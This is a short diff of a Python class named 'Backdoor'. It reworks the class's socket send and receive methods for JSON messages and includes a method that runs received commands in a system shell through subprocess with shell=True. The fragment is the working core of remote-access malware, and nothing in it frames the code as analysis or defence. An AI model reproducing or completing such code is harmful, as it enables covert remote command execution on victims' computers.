@@ -10,17 +10,11 @@ class Backdoor:
 
     def send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(bytes(json_data, 'utf-8'))
+        self.connection.send(json_data)
 
     def receive(self):
-        json_data = ''
-        while True:
-            try:
-                received_data = self.connection.recv(1024).decode('utf-8')
-                json_data += received_data
-            except ValueError as e:
-                continue
-        return json_data
+        json_data = self.connection.recv(1024)
+        return json.loads(json_data)
 
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
